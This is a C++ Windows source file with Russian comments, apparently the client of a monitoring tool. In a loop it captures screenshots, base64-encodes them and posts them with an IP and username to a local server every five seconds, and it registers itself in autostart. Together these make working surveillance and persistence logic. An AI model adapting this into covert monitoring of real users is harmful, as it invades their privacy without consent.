#include "..\inc\client_chop_centaur.h"

/**
 * @brief Кодирует вектор байтов в строку, закодированную в формате Base64.
 *
 * Эта функция принимает вектор байтов и кодирует его с использованием схемы кодирования Base64.
 * Кодирование в Base64 обычно используется для представления бинарных данных в формате ASCII, что удобно
 * для передачи данных, таких как изображения, файлы или другие бинарные данные через текстовые протоколы.
 *
 * @param data Вектор байтов, который необходимо закодировать. Вектор может содержать любые бинарные данные.
 * @return Строка, закодированная в формате Base64, представляющая входные данные. Результирующая строка будет дополнена
 *         символами '=' при необходимости, чтобы обеспечить кратность длины строки 4.
 *
 * @note В этой функции используется стандартный алфавит Base64: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".
 * @note Символ '=' используется для дополнения строки, чтобы ее длина была кратна 4.
 *       Если длина закодированных данных не кратна 4, функция добавит необходимое количество символов '=' в конец строки.
 *
 * @example
 * std::vector<BYTE> data = { 72, 101, 108, 108, 111 };  // ASCII значения для строки "Hello"
 * std::string encoded = base64_encode(data);
 * std::cout << encoded << std::endl;  // Выведет "SGVsbG8="
 */
std::string base64_encode(const std::vector<BYTE> &data)
{
    static const char encode_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    int val = 0;
    int valb = -6;

    for (size_t i = 0; i < data.size(); i++)
    {
        val = (val << 8) + data[i];
        valb += 8;
        while (valb >= 0)
        {
            result.push_back(encode_table[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6)
    {
        result.push_back(encode_table[((val << 8) >> (valb + 8)) & 0x3F]);
    }
    while (result.size() % 4)
    {
        result.push_back('=');
    }
    return result;
}

/**
 * @brief Инициализирует библиотеку Winsock.
 *
 * Эта функция инициализирует библиотеку Winsock, которая необходима для работы с сетевыми сокетами в Windows.
 * Функция вызывает WSAStartup, чтобы подготовить сеть для использования в приложении.
 * Если инициализация завершается с ошибкой, функция выводит сообщение об ошибке и завершает программу.
 *
 * @note
 * Эта функция должна быть вызвана перед использованием любых сетевых функций Windows (например, для создания сокетов).
 *
 * @see WSACleanup()  Для завершения работы с Winsock, вызовите WSACleanup() после завершения работы с сокетами.
 *
 * @throws std::exit(1) Если инициализация не удалась, программа завершится с кодом ошибки 1.
 */
void initWinsock()
{
    SetConsoleCP(CP_UTF8);    
    SetConsoleOutputCP(CP_UTF8);

    WSADATA wsaData;
    int wsResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsResult != 0)
    {
        std::cerr << "WSAStartup завершился с ошибкой: " << wsResult << std::endl;
        exit(1);
    }
}

/**
 * @brief Подключается к серверу по указанному IP-адресу и порту.
 *
 * Эта функция создает сокет, настраивает его для TCP-соединения, и пытается подключиться к серверу
 * по заданному IP-адресу и порту. Если создание сокета или подключение не удается, функция выводит
 * сообщение об ошибке, закрывает сокет и делает задержку перед повторной попыткой подключения.
 * Попытки подключения будут продолжаться до успешного соединения.
 *
 * @param serverIp IP-адрес сервера в строковом формате (например, "192.168.1.1").
 * @param port Порт сервера, к которому необходимо подключиться.
 *
 * @return SOCKET Возвращает дескриптор сокета, который подключен к серверу, если подключение было успешным.
 *
 * @note
 * - Эта функция вызывает `WSAStartup` (через `initWinsock()`) для инициализации библиотеки Winsock.
 * - Функция будет повторно пытаться подключиться к серверу в случае неудачи, с задержкой в 5 секунд между попытками.
 * - Если создание сокета или подключение не удастся, программа завершится с кодом ошибки 1.
 * - В случае успешного подключения, сокет остается открытым и возвращается для дальнейшего использования.
 *
 * @see initWinsock()  Для инициализации Winsock, вызовите `initWinsock()` перед использованием этой функции.
 * @see WSACleanup()  Для завершения работы с Winsock, вызовите `WSACleanup()` после завершения работы с сокетами.
 */
SOCKET connectToServer(const std::string &serverIp, int port)
{

    SetConsoleCP(CP_UTF8);    
    SetConsoleOutputCP(CP_UTF8);
    
    SOCKET clientSocket;
    sockaddr_in serverAddr;

    while (true)
    {
        clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (clientSocket == INVALID_SOCKET)
        {
            std::cerr << "Ошибка создания сокета: " << WSAGetLastError() << std::endl;
            WSACleanup();
            exit(1);
        }

        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(port);
        serverAddr.sin_addr.s_addr = inet_addr(serverIp.c_str());

        if (connect(clientSocket, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            std::cerr << "Ошибка подключения к серверу: " << WSAGetLastError() << ", повторная попытка через 5 секунд..." << std::endl;
            closesocket(clientSocket);
            Sleep(5000);
        }
        else
        {
            std::cout << "Соединение с сервером успешно установлено.\n";
            break;
        }
    }

    return clientSocket;
}


/**
 * @brief Отправляет данные активности клиента на сервер.
 *
 * Эта функция формирует HTTP-запрос с данными о клиенте (IP-адрес, имя пользователя и скриншот в формате base64)
 * в формате JSON и отправляет его на сервер через сокет. Запрос отправляется методом POST на указанный сервер,
 * при этом содержимое запроса включает JSON-строку с переданными параметрами.
 *
 * @param clientSocket Сокет, через который происходит отправка данных.
 * @param ip IP-адрес клиента.
 * @param username Имя пользователя клиента.
 * @param screenshotBase64 Скриншот клиента в формате base64.
 *
 * @return bool Возвращает `true`, если данные успешно отправлены, и `false`, если возникла ошибка при отправке.
 *
 * @note
 * - Формируемый запрос будет отправлен на сервер, расположенный по адресу `127.0.0.1`.
 * - В случае ошибки отправки выводится сообщение с кодом ошибки, полученным через `WSAGetLastError()`.
 *
 * @see WSAGetLastError()  Для получения подробностей о ошибках при отправке данных через сокет.
 */
bool sendActivity(SOCKET clientSocket, const std::string &ip, const std::string &username, const std::string &screenshotBase64)
{

    SetConsoleCP(CP_UTF8);    
    SetConsoleOutputCP(CP_UTF8);

    // Формирование JSON-данных
    std::string jsonData = "{\"ip\": \"" + ip + "\", \"username\": \"" + username + "\", \"screenshot\": \"" + screenshotBase64 + "\"}";

    // Формирование полного HTTP-запроса
    std::string httpRequest = "POST /api/add_client HTTP/1.1\r\n"
                              "Host: 127.0.0.1\r\n"
                              "Content-Type: application/json\r\n"
                              "Content-Length: " +
                              std::to_string(jsonData.length()) + "\r\n"
                                                                  "Connection: close\r\n\r\n" + // Завершение заголовков
                              jsonData;                                                         // Тело запроса

    // Отправка данных
    int sendResult = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
    if (sendResult == SOCKET_ERROR)
    {
        std::cerr << "Отправить не удалось: " << WSAGetLastError() << std::endl;
        return false;
    }

    return true;
}

/**
 * @brief Отправляет активность клиента на сервер в цикле.
 *
 * Эта функция выполняет цикл, в котором каждую итерацию выполняются следующие действия:
 * 1. Устанавливает соединение с сервером.
 * 2. Захватывает скриншот экрана клиента.
 * 3. Кодирует скриншот в строку Base64.
 * 4. Отправляет информацию о клиенте (IP, имя пользователя и скриншот) на сервер.
 * 5. Читает ответ от сервера.
 * 6. Ждёт 5 секунд перед повтором операции.
 *
 * Функция продолжает выполнение в бесконечном цикле до явного завершения.
 *
 * @param param Указатель на параметры, переданные в поток. Не используется в данной реализации.
 * @return Возвращает 0 при завершении работы потока.
 */
DWORD WINAPI sendClientActivity(LPVOID param)
{
    SetConsoleCP(CP_UTF8);    
    SetConsoleOutputCP(CP_UTF8);

    std::string serverIp = "127.0.0.1"; // Адрес сервера
    int serverPort = 5000;              // Порт сервера
    std::string ip = "192.168.0.1";     // IP клиента
    std::string username = "Client1";   // Имя пользователя

    while (true)
    {
        // Подключение к серверу
        SOCKET clientSocket = connectToServer(serverIp, serverPort);

        // Захватить скриншот в виде вектора байтов
        std::vector<BYTE> screenshotData = captureScreenToMemory();

        // Кодирование изображения в base64
        std::string screenshotBase64 = base64_encode(screenshotData);

        // Отправка данных на сервер
        if (sendActivity(clientSocket, ip, username, screenshotBase64))
        {
            std::cout << "Запрос успешно отправлен.\n";

            // Чтение ответа от сервера (опционально)
            char buffer[1024];
            int bytesRead = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            if (bytesRead > 0)
            {
                buffer[bytesRead] = '\0';
                std::cout << "Ответ сервера: " << buffer << std::endl;
            }
        }
        else
        {
            std::cerr << "Не удалось отправить запрос.\n";
        }

        // Закрытие сокета после отправки данных
        closesocket(clientSocket);

        // Задержка перед следующим отправлением (например, 5 секунд)
        Sleep(5000);
    }

    return 0;
}

int main()
{

    SetConsoleCP(CP_UTF8);    
    SetConsoleOutputCP(CP_UTF8);

    initWinsock();

    HANDLE activityThread = CreateThread(
        NULL,
        0,
        sendClientActivity,
        NULL,
        0,
        NULL);

    if (activityThread == NULL)
    {
        std::cerr << "Создать поток не удалось из-за ошибки: " << GetLastError() << std::endl;
        WSACleanup();
        Sleep(5000);
        return 1;
    }

    const char* programName = "client_chop_centaur";

    if (!isProgramInStartup(programName)) {
        char exePath[MAX_PATH];
        if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
            std::cerr << "Ошибка при получении пути к исполнимому файлу." << std::endl;
            return 1;
        }
        addToStartup(exePath, programName);
    } else {
        std::cout << "Программа уже добавлена в автозапуск." << std::endl;
    }

    // Основной поток ждет, удерживая приложение
    WaitForSingleObject(activityThread, INFINITE);
    CloseHandle(activityThread);
    WSACleanup();
    return 0;
}
